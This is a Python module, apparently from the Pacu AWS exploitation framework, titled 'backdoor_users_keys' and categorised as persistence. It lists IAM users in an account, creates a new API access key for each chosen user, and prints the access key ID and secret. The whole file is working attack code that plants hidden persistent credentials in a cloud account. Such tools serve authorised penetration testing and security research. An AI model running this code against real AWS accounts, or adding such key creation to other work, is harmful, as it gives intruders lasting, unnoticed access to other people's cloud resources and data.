#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'backdoor_users_keys',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs based on the idea from https://github.com/dagrz/aws_pwn/blob/master/persistence/backdoor_all_users.py',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'persistence',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Adds API keys to other users.',

    # Description about what the module does and how it works
    'description': 'This module attempts to add an AWS API key to users in the account. If all users are going to be backdoored, if it has not already been run, this module will run "enum_users_roles_policies_groups" to fetch all of the users in the account.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['IAM'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['enum_users_roles_policies_groups'],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--usernames'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--usernames', required=False, default=None, help='A comma-separated list of usernames of the users in the AWS account to backdoor. If not supplied, it defaults to every user in the account')


def help():
    return [module_info, parser.format_help()]


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    fetch_data = pacu_main.fetch_data
    ######

    usernames = []
    client = pacu_main.get_boto3_client('iam')

    if args.usernames is not None:
        if ',' in args.usernames:
            usernames = args.usernames.split(',')
        else:
            usernames = [args.usernames]
    else:
        enumerate_all = input('No user names were passed in as arguments, do you want to enumerate all users and get a prompt for each one (y) or exit (n)? ')
        if enumerate_all.lower() == 'n':
            print('Exiting...')
            return

        if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies_groups', '--users') is False:
            print('Pre-req module not run successfully. Exiting...')
            return

        for user in session.IAM['Users']:
            usernames.append(user['UserName'])

    add_key = ''
    for username in usernames:
        if args.usernames is None:
            add_key = input('  Do you want to add an access key pair to the user {} (y/n)? '.format(username))

        if add_key == 'y' or args.usernames is not None:
            try:
                response = client.create_access_key(
                    UserName=username
                )
                print('    Access Key ID: {}\n'.format(response['AccessKey']['AccessKeyId']))
                print('    Secret Access Key: {}\n'.format(response['AccessKey']['SecretAccessKey']))
            except ClientError as e:
                print('    Error: {}\n'.format(e.response['Error']['Message']))

    print('{} completed.\n'.format(module_info['name']))
    return
